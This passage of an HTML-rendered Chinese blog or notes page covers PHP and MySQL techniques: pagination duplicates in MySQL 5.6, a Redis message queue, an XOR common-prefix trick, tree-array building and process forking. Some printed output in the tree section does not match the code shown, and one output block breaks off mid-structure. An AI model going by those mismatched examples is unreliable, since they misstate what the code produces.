class="line"></span><br><span class="line">之所以<span class="number">5.6</span>出现了第二页数据重复的问题，是因为 priority queue 使用了堆排序的排序方法，而堆排序是一个不稳定的排序方法，也就是相同的值可能排序出来的结果和读出来的数据顺序不一致。</span><br><span class="line"></span><br><span class="line"><span class="number">5.5</span> 没有这个优化，所以也就不会出现这个问题。</span><br><span class="line">也就是说，mysql5<span class="number">.5</span>是不存在本文提到的问题的，<span class="number">5.6</span>版本之后才出现了这种情况。</span><br><span class="line"></span><br><span class="line">我们再看下mysql解释sql语言时的执行顺序：</span><br><span class="line"></span><br><span class="line">(<span class="number">7</span>) SELECT </span><br><span class="line">(<span class="number">8</span>) DISTINCT &lt;select_list&gt;</span><br><span class="line">(<span class="number">1</span>) FROM &lt;left_table&gt;</span><br><span class="line">(<span class="number">3</span>) &lt;join_type&gt; JOIN &lt;right_table&gt;</span><br><span class="line">(<span class="number">2</span>) ON &lt;join_condition&gt;</span><br><span class="line">(<span class="number">4</span>) WHERE &lt;where_condition&gt;</span><br><span class="line">(<span class="number">5</span>) GROUP BY &lt;group_by_list&gt;</span><br><span class="line">(<span class="number">6</span>) HAVING &lt;having_condition&gt;</span><br><span class="line">(<span class="number">9</span>) ORDER BY &lt;order_by_condition&gt;</span><br><span class="line">(<span class="number">10</span>) LIMIT &lt;limit_number&gt;</span><br><span class="line">在我们本文的案例sql中，执行顺序依次为form... where... select... order by... limit...</span><br><span class="line"></span><br><span class="line">由于上述priority queue的原因，在完成select之后，所有记录是以堆排序的方法排列的，在进行order by时，仅把view_count值大的往前移动。但由于limit的因素，排序过程中只需要保留到<span class="number">5</span>条记录即可，view_count并不具备索引有序性，所以当第二页数据要展示时，mysql见到哪一条就拿哪一条，因此，当排序值相同的时候，第一次排序是随意排的，第二次再执行该sql的时候，其结果应该和第一次结果一样。</span><br></pre></td></tr></table></figure>
<h3 id="消息队列处理高并发"><a href="#消息队列处理高并发" class="headerlink" title="消息队列处理高并发"></a>消息队列处理高并发</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">当用户点击按钮提交购买请求时，并不直接马上执行购买请求动作，而是将请求动作存入消息列队，用户的请求到此结束，而在服务器后台，从消息列队中逐一取出请求记录，再进行数据库操作，完成处理之后，将处理结果返回给用户。由于消息队列的存取是先进先出（和栈相反），因此，所有处理将按请求顺序进行处理。由于处理是在后台一个一个完成，因此不会对服务器和数据库造成巨大压力。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>,<span class="number">6379</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  $redis-&gt;LPUSH(<span class="string">'click'</span>,$user_id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(Exception $e) &#123;</span><br><span class="line">  echo $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;pconnect(<span class="string">'127.0.0.1'</span>,<span class="number">6379</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">    $value = $redis-&gt;LPOP(<span class="string">'click'</span>);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">      利用$value进行逻辑和数据处理</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span>(Exception $e) &#123;</span><br><span class="line">    echo $e-&gt;getMessage();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取这两个字符串前面的相同部分"><a href="#获取这两个字符串前面的相同部分" class="headerlink" title="获取这两个字符串前面的相同部分"></a>获取这两个字符串前面的相同部分</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">异或运算是一种非常特殊的运算，简单的说就是“如果两个值相同，返回<span class="number">0</span>|<span class="literal">false</span>，如果两个值不同，则返回<span class="number">1</span>|<span class="literal">true</span>”。</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">samestrin</span>(<span class="params">$str1, $str2</span>) </span>&#123;</span><br><span class="line">  $pos = strspn($str1 ^ $str2, <span class="string">"\0"</span>);</span><br><span class="line">  <span class="keyword">if</span>($pos) &#123;</span><br><span class="line">    <span class="keyword">return</span> substr($str1, <span class="number">0</span>, $pos);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;https:<span class="comment">//www.tangshuang.net/82.html</span></span><br><span class="line">上述代码中，关键部分已经用红色表示出来了。一般情况下，当你对两个字符串进行异或操作的时候，相同的字符的异或结果是<span class="literal">null</span>(“\<span class="number">0</span>”)，所以我们只要找出第一个非<span class="literal">null</span>(“\<span class="number">0</span>”)字符就可以了。如此优雅的操作，得益于计算机领域的异或运算，如若没有这种算法，我们可能需要写一大堆代码来进行匹配对比。</span><br><span class="line"> samestrin(<span class="string">'ab'</span>,<span class="string">'abd'</span>)</span><br><span class="line">=&gt; <span class="string">"ab"</span></span><br></pre></td></tr></table></figure>
<h3 id="树形结构算法"><a href="#树形结构算法" class="headerlink" title="树形结构算法"></a>树形结构算法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构建层级（树状）数组</span></span><br><span class="line"><span class="comment"> * @param array $array 要进行处理的一维数组，经过该函数处理后，该数组自动转为树状数组</span></span><br><span class="line"><span class="comment"> * @param string $pid 父级ID的字段名</span></span><br><span class="line"><span class="comment"> * @return array|bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">array_tree</span>(<span class="params">&amp;$array, $pid = <span class="string">'pid'</span></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 子元素计数器</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">array_children_count</span>(<span class="params">$array,$pid</span>) </span>&#123;</span><br><span class="line">    $counter = array();</span><br><span class="line">    foreach($array <span class="keyword">as</span> $item) &#123;</span><br><span class="line">      $count = isset($counter[$item[$pid]]) ? $counter[$item[$pid]] : <span class="number">0</span>;</span><br><span class="line">      $count ++;</span><br><span class="line">      $counter[$item[$pid]] = $count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $counter;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 把元素插入到对应的父元素children字段</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">array_child_append</span>(<span class="params">$parent,$pid,$child</span>) </span>&#123;</span><br><span class="line">    foreach($parent <span class="keyword">as</span> &amp;$item) &#123;</span><br><span class="line">      <span class="keyword">if</span>($item[<span class="string">'id'</span>] == $pid) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!isset($item[<span class="string">'children'</span>])) $item[<span class="string">'children'</span>] = array();</span><br><span class="line">        $item[<span class="string">'children'</span>][] = $child;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $parent;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 开始程序</span></span><br><span class="line">  $counter = array_children_count($array,$pid);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果顶级元素为0个，那么直接返回false</span></span><br><span class="line">  <span class="keyword">if</span>($counter[<span class="number">0</span>] == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 准备顶级元素</span></span><br><span class="line">  $tree = array();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 位移</span></span><br><span class="line">  <span class="keyword">while</span>(isset($counter[<span class="number">0</span>]) &amp;&amp; $counter[<span class="number">0</span>] &gt; <span class="number">0</span>) &#123; <span class="comment">// 如果顶级栏目的子元素计数器仍然大于0，那么仍然往下执行循环</span></span><br><span class="line">    $temp = array_shift($array);</span><br><span class="line">    <span class="keyword">if</span>(isset($counter[$temp[<span class="string">'id'</span>]]) &amp;&amp; $counter[$temp[<span class="string">'id'</span>]] &gt; <span class="number">0</span>) &#123; <span class="comment">// 如果数组的第一个元素的子元素个数大于0，那么把该元素放置到数组的末端</span></span><br><span class="line">      array_push($array,$temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">// 相反，如果该数组的第一个元素没有子元素，那么把该元素移动到其父元素的children字段中，同时，该元素从原数组中被删除</span></span><br><span class="line">      <span class="keyword">if</span>($temp[$pid] == <span class="number">0</span>)</span><br><span class="line">        $tree[] = $temp;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        $array = array_child_append($array,$temp[$pid],$temp);</span><br><span class="line">    &#125;</span><br><span class="line">    $counter = array_children_count($array,$pid);</span><br><span class="line">  &#125;</span><br><span class="line">  $array = $tree;</span><br><span class="line">  <span class="keyword">return</span> $tree;</span><br><span class="line">&#125;</span><br><span class="line">$arr = array(</span><br><span class="line">  array(<span class="string">'id'</span> =&gt; <span class="number">53</span>,<span class="string">'pid'</span> =&gt; <span class="number">0</span>),</span><br><span class="line">  array(<span class="string">'id'</span> =&gt; <span class="number">64</span>,<span class="string">'pid'</span> =&gt; <span class="number">53</span>),</span><br><span class="line">  array(<span class="string">'id'</span> =&gt; <span class="number">70</span>,<span class="string">'pid'</span> =&gt; <span class="number">42</span>)</span><br><span class="line">);</span><br><span class="line"><span class="comment">//$r=array_tree($arr,'pid');print_r($r);</span></span><br><span class="line"></span><br><span class="line">$demo1 = array(</span><br><span class="line">  <span class="number">1</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">1</span>,<span class="string">'title'</span> =&gt; <span class="string">'title1'</span>,<span class="string">'pid'</span> =&gt; <span class="number">0</span>),</span><br><span class="line">  <span class="number">2</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">2</span>,<span class="string">'title'</span> =&gt; <span class="string">'title2'</span>,<span class="string">'pid'</span> =&gt; <span class="number">1</span>),</span><br><span class="line">  <span class="number">3</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">3</span>,<span class="string">'title'</span> =&gt; <span class="string">'title3'</span>,<span class="string">'pid'</span> =&gt; <span class="number">1</span>),</span><br><span class="line">  <span class="number">4</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">4</span>,<span class="string">'title'</span> =&gt; <span class="string">'title4'</span>,<span class="string">'pid'</span> =&gt; <span class="number">2</span>),</span><br><span class="line">  <span class="number">5</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">5</span>,<span class="string">'title'</span> =&gt; <span class="string">'title5'</span>,<span class="string">'pid'</span> =&gt; <span class="number">2</span>),</span><br><span class="line">  <span class="number">6</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">6</span>,<span class="string">'title'</span> =&gt; <span class="string">'title6'</span>,<span class="string">'pid'</span> =&gt; <span class="number">0</span>)</span><br><span class="line">);</span><br><span class="line">$demo1 = array_tree($demo1);<span class="comment">// 或者直接使用array_tree($demo1);，无需返回值https://www.tangshuang.net/2073.html https://3v4l.org/kngT8</span></span><br><span class="line">print_r($demo1);</span><br><span class="line"><span class="built_in">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [name] =&gt; Nance</span><br><span class="line">            [age] =&gt; <span class="number">21</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [name] =&gt; Kenvi</span><br><span class="line">            [age] =&gt; <span class="number">18</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"><span class="built_in">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; <span class="number">6</span></span><br><span class="line">            [title] =&gt; title6</span><br><span class="line">            [pid] =&gt; <span class="number">0</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; <span class="number">1</span></span><br><span class="line">            [title] =&gt; title1</span><br><span class="line">            [pid] =&gt; <span class="number">0</span></span><br><span class="line">            [children] =&gt; <span class="built_in">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [id] =&gt; <span class="number">3</span></span><br><span class="line">                            [title] =&gt; title3</span><br><span class="line">                            [pid] =&gt; <span class="number">1</span></span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [id] =&gt; <span class="number">2</span></span><br><span class="line">                            [title] =&gt; title2</span><br><span class="line">                            [pid] =&gt; <span class="number">1</span></span><br><span class="line">                            [children] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                (</span><br><span class="line">                                    [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                        (</span><br><span class="line">                                            [id] =&gt; <span class="number">4</span></span><br><span class="line">                                            [title] =&gt; title4</span><br><span class="line">                                            [pid] =&gt; <span class="number">2</span></span><br><span class="line">                                        )</span><br><span class="line"></span><br><span class="line">                                    [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                        (</span><br><span class="line">                                            [id] =&gt; <span class="number">5</span></span><br><span class="line">                                            [title] =&gt; title5</span><br><span class="line">                                            [pid] =&gt; <span class="number">2</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">array_tree</span>(<span class="params">$array</span>) </span>&#123;</span><br><span class="line">    $result = array();</span><br><span class="line">    $tmp = array();</span><br><span class="line">    foreach($array <span class="keyword">as</span> $item) &#123;</span><br><span class="line">      <span class="keyword">if</span>($item[<span class="string">'parent_id'</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">        $i = count($result);</span><br><span class="line">        $result[$i] = $item;</span><br><span class="line">        $id = $item[<span class="string">'id'</span>];</span><br><span class="line">        $tmp[$id] = &amp;$result[$i];<span class="comment">//这一句保证了当无论$tmp[$id]还是$result[$i]发生变化，都会让另外一个值同时发生变化。而 $tmp[$parent_id]['children'][$i] = $item; 实际上导致$result[$parent_id]发生了变化。</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        $id = $item[<span class="string">'id'</span>];</span><br><span class="line">        $parent_id = $item[<span class="string">'parent_id'</span>];</span><br><span class="line">        $parent = $tmp[$parent_id];</span><br><span class="line">        $i = count($parent[<span class="string">'children'</span>]);</span><br><span class="line">        $tmp[$parent_id][<span class="string">'children'</span>][$i] = $item;</span><br><span class="line">        $tmp[$id] = &amp;$tmp[$parent_id][<span class="string">'children'</span>][$i];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">  &#125;</span><br><span class="line">  当$b = &amp;$a时，$b和$a同时引用同一个内容（指针指向同一块内存），无论$a或$b谁发生变化，这个内容都会发生变化，进而呈现为$a和$b保持同步的变化。</span><br><span class="line">  https:<span class="comment">//www.tangshuang.net/1701.html</span></span><br><span class="line">  print_r(array_tree($demo1));</span><br><span class="line">    <span class="built_in">Array</span></span><br><span class="line">    (</span><br><span class="line">        [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">            (</span><br><span class="line">                [id] =&gt; <span class="number">1</span></span><br><span class="line">                [title] =&gt; title1</span><br><span class="line">                [parent_id] =&gt; <span class="number">0</span></span><br><span class="line">                [children] =&gt; <span class="built_in">Array</span></span><br><span class="line">                    (</span><br><span class="line">                        [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                            (</span><br><span class="line">                                [id] =&gt; <span class="number">2</span></span><br><span class="line">                                [title] =&gt; title2</span><br><span class="line">                                [parent_id] =&gt; <span class="number">1</span></span><br><span class="line">                                [children] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                    (</span><br><span class="line">                                        [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                            (</span><br><span class="line">                                                [id] =&gt; <span class="number">4</span></span><br><span class="line">                                                [title] =&gt; title4</span><br><span class="line">                                                [parent_id] =&gt; <span class="number">2</span></span><br><span class="line">                                            )</span><br><span class="line">    </span><br><span class="line">                                        [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                            (</span><br><span class="line">                                                [id] =&gt; <span class="number">5</span></span><br><span class="line">                                                [title] =&gt; title5</span><br><span class="line">                                                [parent_id] =&gt; <span class="number">2</span></span><br><span class="line">                                            )</span><br><span class="line">    </span><br><span class="line">                                    )</span><br><span class="line">    </span><br><span class="line">                            )</span><br><span class="line">    </span><br><span class="line">                        [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                            (</span><br><span class="line">                                [id] =&gt; <span class="number">3</span></span><br><span class="line">                                [title] =&gt; title3</span><br><span class="line">                                [parent_id] =&gt; <span class="number">1</span></span><br><span class="line">                            )</span><br><span class="line">    </span><br><span class="line">                    )</span><br><span class="line">    </span><br><span class="line">            )</span><br><span class="line">    </span><br><span class="line">        [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">            (</span><br><span class="line">                [id] =&gt; <span class="number">6</span></span><br><span class="line">                [title] =&gt; title6</span><br><span class="line">                [parent_id] =&gt; <span class="number">0</span></span><br><span class="line">            )</span><br><span class="line">    </span><br><span class="line">    )</span><br><span class="line">    $tmp[$id] = &amp;$tmp[$parent_id][<span class="string">'children'</span>][$i];这一句起到了关键性作用。加上这一句之后，我们再来跑一遍array(<span class="string">'id'</span> =&gt; <span class="number">23</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">12</span>,...)这个元素。</span><br><span class="line">    </span><br><span class="line">    [<span class="number">2</span>]=&gt; array(<span class="string">'id'</span> =&gt; <span class="number">12</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">5</span>,...)</span><br><span class="line">    </span><br><span class="line">    $tmp[<span class="number">5</span>][<span class="string">'children'</span>][<span class="number">0</span>] = array(<span class="string">'id'</span> =&gt; <span class="number">12</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">5</span>,...)  <span class="comment">// 重新从①开始演示</span></span><br><span class="line">    </span><br><span class="line">    $result[<span class="number">0</span>][<span class="string">'children'</span>][<span class="number">0</span>] = array(<span class="string">'id'</span> =&gt; <span class="number">12</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">5</span>,...) <span class="comment">// 内部结果</span></span><br><span class="line">    </span><br><span class="line">    $tmp[<span class="number">12</span>] = &amp;$tmp[<span class="number">5</span>][<span class="string">'children'</span>][<span class="number">0</span>]  <span class="comment">// 第二个&amp;出现了</span></span><br><span class="line">    </span><br><span class="line">    [<span class="number">5</span>]=&gt; array(<span class="string">'id'</span> =&gt; <span class="number">23</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">12</span>,...)</span><br><span class="line">    </span><br><span class="line">    $tmp[<span class="number">12</span>][<span class="string">'children'</span>][<span class="number">0</span>] = array(<span class="string">'id'</span> =&gt; <span class="number">23</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">12</span>,...)</span><br><span class="line">    </span><br><span class="line">    由于第二个&amp;引用的原因，实际上发生了：</span><br><span class="line">    </span><br><span class="line">    $tmp[<span class="number">5</span>][<span class="string">'children'</span>][<span class="number">0</span>][<span class="string">'children'</span>][<span class="number">0</span>] = array(<span class="string">'id'</span> =&gt; <span class="number">23</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">12</span>,...) <span class="comment">// 内部结果</span></span><br><span class="line">    </span><br><span class="line">    $result[<span class="number">0</span>][<span class="string">'children'</span>][<span class="number">0</span>][<span class="string">'children'</span>][<span class="number">0</span>] = array(<span class="string">'id'</span> =&gt; <span class="number">23</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">12</span>,...) <span class="comment">// 内部结果</span></span><br><span class="line">    这个时候你可能已经看出了端倪。父子关系变成了 <span class="number">5</span> &gt; <span class="number">12</span> &gt; <span class="number">23</span>，而这组关系，全部存储在了id=<span class="number">5</span>的这个顶级元素中，以多重的children元素实现了父子孙结构。</span><br></pre></td></tr></table></figure>
<h3 id="PHP进程分支设计"><a href="#PHP进程分支设计" class="headerlink" title="PHP进程分支设计"></a>PHP进程分支设计</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/tangshuang/php-events-async-callback https://www.tangshuang.net/2086.html</span></span><br><span class="line">$pid = pcntl_fork();</span><br><span class="line"><span class="keyword">if</span>($pid &gt; <span class="number">0</span>)&#123; <span class="comment">//父进程代码</span></span><br><span class="line">  exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">elseif($pid == <span class="number">0</span>) &#123; <span class="comment">//子进程代码</span></span><br><span class="line">  exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">你会发现httpd或php-fpm的进程会增加，也就是说，pcntl其实是通过重新开启php进程，并通过其他机制实现进程之间的通信的。</span><br><span class="line">proc_open，popen也是利用httpd来实现多进程</span><br><span class="line"></span><br><span class="line">$proc=proc_open(<span class="string">"echo foo"</span>, array(  </span><br><span class="line">  array(<span class="string">"pipe"</span>,<span class="string">"r"</span>),  </span><br><span class="line">  array(<span class="string">"pipe"</span>,<span class="string">"w"</span>),  </span><br><span class="line">  array(<span class="string">"pipe"</span>,<span class="string">"w"</span>)</span><br><span class="line">), $pipes);  </span><br><span class="line">print stream_get_contents($pipes[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span> <span class="string">'Events.php'</span>;</span><br><span class="line"><span class="built_in">require</span> <span class="string">'EventListener.class.php'</span>;</span><br><span class="line"></span><br><span class="line">$EventListener = <span class="keyword">new</span> EventListener(<span class="string">'timeout'</span>);</span><br><span class="line">$EventListener-&gt;add(<span class="string">'timeout'</span>,<span class="string">'setTimeout'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setTimeout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  sleep(<span class="number">10</span>);</span><br><span class="line">  file_put_contents(<span class="string">'./log.txt'</span>,<span class="string">'延时回调成功，现在时间：'</span>.date(<span class="string">'Y-m-d H:i:s'</span>),FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你自己的代码流程https://github.com/tangshuang/php-events-async-callback</span></span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">'./log.txt'</span>,<span class="string">'延时操作开始，现在时间：'</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"\r"</span>,LOCK_EX);</span><br><span class="line">$EventListener-&gt;run(<span 